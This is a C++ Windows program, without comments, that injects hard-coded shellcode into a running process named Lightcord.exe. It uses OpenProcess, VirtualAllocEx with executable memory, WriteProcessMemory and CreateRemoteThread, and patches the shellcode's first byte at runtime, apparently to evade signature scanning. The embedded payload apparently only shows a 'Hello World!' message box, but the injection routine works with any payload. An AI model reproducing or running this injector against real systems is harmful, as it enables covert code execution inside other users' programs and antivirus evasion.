#include <iostream>
#include <Windows.h>
#include <tlhelp32.h>
#include <string>

using namespace std;


DWORD GetPid(const string& ProcessName);

int main(void){
		unsigned char shellcode[] = 
		"\x35\xc9\x64\x8b\x49\x30\x8b\x49\x0c\x8b\x49\x1c"
        "\x8b\x59\x08\x8b\x41\x20\x8b\x09\x80\x78\x0c\x33"
        "\x75\xf2\x8b\xeb\x03\x6d\x3c\x8b\x6d\x78\x03\xeb"
        "\x8b\x45\x20\x03\xc3\x33\xd2\x8b\x34\x90\x03\xf3"
        "\x42\x81\x3e\x47\x65\x74\x50\x75\xf2\x81\x7e\x04"
        "\x72\x6f\x63\x41\x75\xe9\x8b\x75\x24\x03\xf3\x66"
        "\x8b\x14\x56\x8b\x75\x1c\x03\xf3\x8b\x74\x96\xfc"
        "\x03\xf3\x33\xff\x57\x68\x61\x72\x79\x41\x68\x4c"
        "\x69\x62\x72\x68\x4c\x6f\x61\x64\x54\x53\xff\xd6"
        "\x33\xc9\x57\x66\xb9\x33\x32\x51\x68\x75\x73\x65"
        "\x72\x54\xff\xd0\x57\x68\x6f\x78\x41\x01\xfe\x4c"
        "\x24\x03\x68\x61\x67\x65\x42\x68\x4d\x65\x73\x73"
        "\x54\x50\xff\xd6\x57\x68\x72\x6c\x64\x21\x68\x6f"
        "\x20\x57\x6f\x68\x48\x65\x6c\x6c\x8b\xcc\x57\x57"
        "\x51\x57\xff\xd0\x57\x68\x65\x73\x73\x01\xfe\x4c"
        "\x24\x03\x68\x50\x72\x6f\x63\x68\x45\x78\x69\x74"
        "\x54\x53\xff\xd6\x57\xff\xd0";
        
        char FirstByteOfShellcode[] = "\x33";
        
        HANDLE ProcessH;
        PVOID RemoteBuff;
        HANDLE cRemoteThread;
        string szProcess;
        
        size_t dwSize = sizeof(shellcode);
        
        ProcessH = OpenProcess(PROCESS_ALL_ACCESS, false, GetPid("Lightcord.exe"));
        if(ProcessH == NULL){
				GetLastError();
				return -1;
		}
		
        RemoteBuff = VirtualAllocEx(ProcessH, 0, dwSize, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
        if(RemoteBuff == NULL){
				GetLastError();
				return -1;
		}
        
        memcpy(shellcode, FirstByteOfShellcode, 1);
		WriteProcessMemory(ProcessH, RemoteBuff, shellcode, dwSize, 0);
        
        cRemoteThread = CreateRemoteThread(ProcessH, 0, 0, (LPTHREAD_START_ROUTINE)RemoteBuff, 0, 0, 0);
		if(cRemoteThread == NULL){
				GetLastError();
				return -1;
		}
		
		CloseHandle(ProcessH);
		return EXIT_SUCCESS;
}


DWORD GetPid(const string& ProcessName){
    PROCESSENTRY32 pinfo;
    pinfo.dwSize = sizeof(PROCESSENTRY32);
    
    HANDLE ProcessesShot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if(ProcessesShot == INVALID_HANDLE_VALUE){
        GetLastError();
        return -1;
    }
    
    Process32First(ProcessesShot, &pinfo);
    
    if(!ProcessName.compare(pinfo.szExeFile)){
        CloseHandle(ProcessesShot);
        return pinfo.th32ProcessID;
    }
    
    while(Process32Next(ProcessesShot, &pinfo)){
        if(!ProcessName.compare(pinfo.szExeFile)){
            CloseHandle(ProcessesShot);
            return pinfo.th32ProcessID;
        }
    }
    CloseHandle(ProcessesShot);
    return 0;
}
